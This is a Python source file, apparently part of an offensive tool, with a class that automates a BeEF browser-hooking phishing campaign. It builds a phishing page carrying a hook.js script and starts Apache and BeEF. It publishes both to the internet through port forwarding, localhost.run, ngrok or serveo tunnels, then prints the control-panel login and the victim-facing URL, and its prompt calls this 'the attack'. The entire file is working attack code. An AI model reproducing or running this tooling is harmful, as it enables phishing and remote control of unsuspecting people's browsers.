import subprocess
import os
import yaml
import time
import re
import multiprocessing
from sources import Sources
from phish_create import PhishCreate
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET

class PhishSetup:
    def __init__(self):
        self.phishcreate = PhishCreate()
        self.sources = Sources()
        
 

    def setup_within_network(self):
        original_dir = os.getcwd()
        try:
            os.system("clear")
            self.wireless_adaptor = self.sources.selectadapter()
            url = self.sources.get_ip_address(self.wireless_adaptor)
            self.beef_config_file_lan()
            hook_url = f"http://{url}:3000/hook.js"
            os.system("clear")
            self.phishcreate.setup_phish_page(hook_url)
            self.start_server()
            os.system("clear")
            os.chdir("src/beef-master/")
            try:
                process = subprocess.Popen(['./beef'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                print(f"{RED}[+] Beef Started.... Press CTRL+C to close.......{RESET}")
                with open('config.yaml', 'r') as file:
                    config = yaml.safe_load(file)
                print(f"\n{BLUE}[!] Your Panel Login Info:{RESET}{RED} Username -->{RESET}{GREEN} {config['beef']['credentials']['user']}{RESET} \t {RED}Password -->{RESET}{GREEN} {config['beef']['credentials']['passwd']}{RESET}")
                print(f"\n{BLUE}[+] Your Website (containing beef hook javascript) URL -->{RESET}{GREEN}  http://{url}{RESET}")
                print(f"\n{BLUE}[+] Your Beef UI Panel URL -->{RESET}{GREEN} http://{url}:3000/ui/panel{RESET}")
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                process.wait()
        except KeyboardInterrupt:
            self.stop_server()
            os.chdir(original_dir)
        except Exception as e:
            print(f"{RED}\n[-] Following error occur:-->{RESET}")
            self.stop_server()
            os.chdir(original_dir)
        else:
            self.stop_server()
            os.chdir(original_dir)



    def setup_with_port_forwarding(self):
        original_dir = os.getcwd()
        try:
            os.system("clear")
            self.wireless_adaptor = self.sources.selectadapter()
            ip_address = self.sources.get_ip_address(self.wireless_adaptor)
            os.system("clear")
            print(f"{BLUE}[!] Place your internal IP address={ip_address} and Port=443 external port and Port=3000 internal port for beef and Port=80 for webserver for port forwarding in router setting.........\n")
            check_port_forwarding = input(f"{GREEN}[?] After port forwarding in router setting, press 'y' to start the attack --> {RESET}")
            if check_port_forwarding == "y":
                os.system("clear")
                url = self.sources.get_external_ip()
                self.beef_config_file_wan(url,https_value=False)
                hook_url = f"http://{url}:443/hook.js"
                os.system("clear")
                self.phishcreate.setup_phish_page(hook_url)
                self.start_server()
                os.system("clear")
                os.chdir("src/beef-master/")
                try:
                    process = subprocess.Popen(['./beef'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    print(f"{RED}[+] Beef Started.... Press CTRL+C to close.......{RESET}")
                    with open('config.yaml', 'r') as file:
                        config = yaml.safe_load(file)
                    print(f"\n{BLUE}[!] Your Panel Login Info:{RESET}{RED} Username -->{RESET}{GREEN} {config['beef']['credentials']['user']}{RESET} \t {RED}Password -->{RESET}{GREEN} {config['beef']['credentials']['passwd']}{RESET}")
                    print(f"\n{BLUE}[+] Your Website (containing beef hook javascript) URL -->{RESET}{GREEN}  http://{url}{RESET}")
                    print(f"\n{BLUE}[+] Your Beef UI Panel URL -->{RESET}{GREEN} http://{url}:443/ui/panel{RESET}")
                    process.wait()
                except KeyboardInterrupt:
                    process.terminate()
                    process.wait()
        except KeyboardInterrupt:
            self.stop_server()
            os.chdir(original_dir)
        except Exception as e:
            print(f"{RED}\n[-] Following error occur:-->{RESET}")
            self.stop_server()
            os.chdir(original_dir)
        else:
            self.stop_server()
            os.chdir(original_dir)
                                         

    def setup_with_localhost_run(self):
        original_dir = os.getcwd()
        try:
            os.system("clear")
            key_name = self.sources.generate_ssh_key()
            os.system("clear")
            queue = multiprocessing.Queue()
            source = Sources()
            port_forward_process = multiprocessing.Process(target=source.port_forward_using_localhostrun, args=(key_name,"3000",queue,))
            port_forward_process.start()
            print(f"{RED}[--] Waiting for URl. Somethimes it may takes minutes due to slow internet issue or slow localhost.run server issue......{RESET}")
            beef_url = ""
            while True:
                beef_url = str(queue.get())
                if beef_url == "":
                    pass
                else:
                    beef_url = beef_url
                    queue.close()
                    break
            os.system("clear")
            self.beef_config_file_wan(beef_url,https_value=True)
            hook_url = f"https://{beef_url}:443/hook.js"
            self.phishcreate.setup_phish_page(hook_url)
            self.start_server()
            queue1 = multiprocessing.Queue()
            source1 = Sources()
            port_forward_process1 = multiprocessing.Process(target=source1.port_forward_using_localhostrun, args=(key_name,"",queue1,))
            port_forward_process1.start()
            print(f"{RED}[--] Waiting for URl. Somethimes it may takes minutes due to slow internet issue or slow localhost.run server issue......{RESET}")
            webserver_url = ""
            while True:
                webserver_url = str(queue1.get())
                if webserver_url == "":
                    pass
                else:
                    webserver_url = webserver_url
                    queue1.close()
                    break
            os.system("clear")
            os.chdir("src/beef-master/")
            try:
                process = subprocess.Popen(['./beef'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                print(f"{RED}[+] Beef Started.... Press CTRL+C twice to close.......{RESET}")
                with open('config.yaml', 'r') as file:
                    config = yaml.safe_load(file)
                print(f"\n\r{BLUE}[!] Your Panel Login Info:{RESET}{RED} Username -->{RESET}{GREEN} {config['beef']['credentials']['user']}{RESET} \t {RED}Password -->{RESET}{GREEN} {config['beef']['credentials']['passwd']}{RESET}")
                print(f"\n\r{BLUE}[+] Your Website (containing beef hook javascript) URL -->{RESET}{GREEN}  https://{webserver_url}{RESET}")
                print(f"\n\r{BLUE}[+] Your Beef UI Panel URL -->{RESET}{GREEN} https://{beef_url}:443/ui/panel{RESET}")
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                process.wait()
        except KeyboardInterrupt:
            self.stop_server()
            os.chdir(original_dir)
        except Exception as e:
            print(f"{RED}\n[-] Following error occur:-->{RESET}")
            self.stop_server()
            os.chdir(original_dir)
        else:
            self.stop_server()
            os.chdir(original_dir)
                                         
    

    def setup_with_ngrok(self):
        ngrok_installed = 0
        token_config = 0
        result = subprocess.run(f"ngrok", shell=True, capture_output=True, text=True)
        if "ngrok: not found" in result.stderr:
            print("[-] Ngrok is not installed......")
            print("Installed it on your system so that it could be used as command like 'ngrok http 80' etc......")
            time.sleep(2)
        else:
            ngrok_installed = 1
        if ngrok_installed == 1:
            while token_config == 0:
                file_path = f"{os.getcwd()}/ngrok.yml"
                with open('ngrok.yml', 'r') as file:
                    config = yaml.safe_load(file)
                os.system("clear")
                if config['authtoken'] == "None":
                    token = input("[?] Provide the token for ngrok. Sign up on ngrok website to get one. (Auth-token)--> ")
                    if token == "" or token == " ":
                        pass
                    else:
                        token_config = 1
                        config['authtoken'] = token
                        with open('ngrok.yml', 'w') as file:
                            yaml.dump(config, file)
                else:
                    token = config['authtoken']
                    print(f"[+] Auth-Token already configured --> '{token}'")
                    change_token = input("Do you want to change auth-token. Type 'y' to change --> ").lower()
                    if change_token == "y":
                        token = input("[?] Provide the token for ngrok. Sign up on ngrok website to get one. (Auth-token)--> ")
                        if token == "" or token == " ":
                            pass
                        else:
                            token_config = 1
                            config['authtoken'] = token
                            with open('ngrok.yml', 'w') as file:
                                yaml.dump(config, file)
                    token_config = 1

        if token_config == 1 and ngrok_installed == 1:
            original_dir = os.getcwd()
            apache_port = self.sources.port_apache()
            with open('ngrok.yml', 'r') as file:
                config = yaml.safe_load(file)
            config['tunnels']['web-app']['addr'] = apache_port
            with open('ngrok.yml', 'w') as file:
                yaml.dump(config, file)
            try:
                os.system("clear")
                queue = multiprocessing.Queue()
                ngrok_process1 = multiprocessing.Process(target=self.sources.ngrok_run, args=(queue,))
                ngrok_process1.start()
                urls = {}
                while True:
                    urls = queue.get()
                    if 'web-app' in urls and "beef-app" in urls:
                        queue.close()
                        break
                    else:
                        pass
                os.system("clear")
                beef_url = str(urls["beef-app"]).replace("https://","")
                webserver_url = str(urls["web-app"]).replace("https://","")
                self.beef_config_file_wan(beef_url,https_value=True)
                hook_url = f"https://{beef_url}:443/hook.js"
                self.phishcreate.setup_phish_page(hook_url)
                self.start_server()
                os.system("clear")
                os.chdir("src/beef-master/")
                try:
                    process = subprocess.Popen(['./beef'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    print(f"{RED}[+] Beef Started.... Press CTRL+C twice to close.......{RESET}")
                    with open('config.yaml', 'r') as file:
                        config = yaml.safe_load(file)
                    print(f"\n\r{BLUE}[!] Your Panel Login Info:{RESET}{RED} Username -->{RESET}{GREEN} {config['beef']['credentials']['user']}{RESET} \t {RED}Password -->{RESET}{GREEN} {config['beef']['credentials']['passwd']}{RESET}")
                    print(f"\n\r{BLUE}[+] Your Website (containing beef hook javascript) URL -->{RESET}{GREEN}  https://{webserver_url}{RESET}")
                    print(f"\n\r{BLUE}[+] Your Beef UI Panel URL -->{RESET}{GREEN} https://{beef_url}:443/ui/panel{RESET}")
                    process.wait()
                except KeyboardInterrupt:
                    process.terminate()
                    process.wait()    
            except KeyboardInterrupt:
                self.stop_server()
                os.chdir(original_dir)
                subprocess.run("killall ngrok",shell=True)
            except Exception as e:
                print(f"{RED}\n[-] Following error occur:-->{RESET}")
                self.stop_server()
                os.chdir(original_dir)
                subprocess.run("killall ngrok",shell=True)
            else:
                self.stop_server()
                os.chdir(original_dir)
                subprocess.run("killall ngrok",shell=True)



    def setup_with_serveo(self):
        original_dir = os.getcwd()
        try:
            os.system("clear")
            key_name = self.sources.generate_ssh_key()
            os.system("clear")
            command = f"ssh -i {key_name} -R 80:localhost:3000 serveo.net >> serveo_output.txt 2>&1&"
            subprocess.run(command, shell=True)
            print(f"{RED}[--] Waiting for URl. Somethimes it may takes minutes due to slow internet issue or slow localhost.run server issue......{RESET}")
            while True:
                try:
                    with open("serveo_output.txt", 'r') as file:
                        content = file.read()
                    url_pattern = r'https://[a-zA-Z0-9]+\.serveo\.net'
                    match = re.search(url_pattern, content)
                    if match:
                        url = match.group(0)
                        break
                    else:
                        pass
                except FileNotFoundError:
                    pass
                except Exception as e:
                    pass

            beef_url = url.replace("https://","")
            try:
                os.remove("serveo_output.txt")
            except FileNotFoundError:
                pass
            os.system("clear")
            self.beef_config_file_wan(beef_url,https_value=True)
            hook_url = f"https://{beef_url}:443/hook.js"
            self.phishcreate.setup_phish_page(hook_url)
            self.start_server()
            apache_port = self.sources.port_apache()
            command = f"ssh -i {key_name} -R 80:localhost:{apache_port} serveo.net >> serveo_output.txt 2>&1&"
            subprocess.run(command, shell=True)
            print(f"{RED}[--] Waiting for URl. Somethimes it may takes minutes due to slow internet issue or slow localhost.run server issue......{RESET}")
            while True:
                try:
                    with open("serveo_output.txt", 'r') as file:
                        content = file.read()
                    url_pattern = r'https://[a-zA-Z0-9]+\.serveo\.net'
                    match = re.search(url_pattern, content)
                    if match:
                        url = match.group(0)
                        break
                    else:
                        pass
                except FileNotFoundError:
                    pass
                except Exception as e:
                    pass
            webserver_url = url.replace("https://","")
            try:
                os.remove("serveo_output.txt")
            except FileNotFoundError:
                pass
            os.system("clear")
            os.chdir("src/beef-master/")
            try:
                process = subprocess.Popen(['./beef'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                print(f"{RED}[+] Beef Started.... Press CTRL+C twice to close.......{RESET}")
                with open('config.yaml', 'r') as file:
                    config = yaml.safe_load(file)
                print(f"\n\r{BLUE}[!] Your Panel Login Info:{RESET}{RED} Username -->{RESET}{GREEN} {config['beef']['credentials']['user']}{RESET} \t {RED}Password -->{RESET}{GREEN} {config['beef']['credentials']['passwd']}{RESET}")
                print(f"\n\r{BLUE}[+] Your Website (containing beef hook javascript) URL -->{RESET}{GREEN}  https://{webserver_url}{RESET}")
                print(f"\n\r{BLUE}[+] Your Beef UI Panel URL -->{RESET}{GREEN} https://{beef_url}:443/ui/panel{RESET}")
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                process.wait()
        except KeyboardInterrupt:
            self.stop_server()
            os.chdir(original_dir)
            subprocess.run("killall ssh",shell=True)
        except Exception as e:
            print(f"{RED}\n[-] Following error occur:-->{RESET}")
            self.stop_server()
            os.chdir(original_dir)
            subprocess.run("killall ssh",shell=True)
        else:
            self.stop_server()
            os.chdir(original_dir)
            subprocess.run("killall ssh",shell=True)




    def start_server(self):
        result = subprocess.run(f"a2enmod rewrite", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"\n{GREEN}[+] Starting Apache Serve.....{RESET}")
        result = subprocess.run(f"service apache2 start", shell=True, capture_output=True, text=True)
        print(result.stderr)
    def stop_server(self):
        result = subprocess.run(f"a2dismod rewrite", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"\n{RED}[-] Stopping Apache Serve.....{RESET}")
        result = subprocess.run(f"service apache2 stop", shell=True, capture_output=True, text=True)
        print(result.stderr)

    def beef_config_file_wan(self,url,https_value):
        with open('src/beef-master/config.yaml', 'r') as file:
            config = yaml.safe_load(file)
        config['beef']['http']['public'] = {'host': url, 'https': https_value, 'port': 443}
        config['beef']['http']['allow_reverse_proxy'] = True
        with open('src/beef-master/config.yaml', 'w') as file:
            yaml.dump(config, file, default_flow_style=False, default_style="'")


    def beef_config_file_lan(self):
        with open('src/beef-master/config.yaml', 'r') as file:
            config = yaml.safe_load(file)
        config['beef']['http'].pop('public', None)
        config['beef']['http']['allow_reverse_proxy'] = False
        with open('src/beef-master/config.yaml', 'w') as file:
            yaml.dump(config, file, default_flow_style=False, default_style="'")




    
        
        
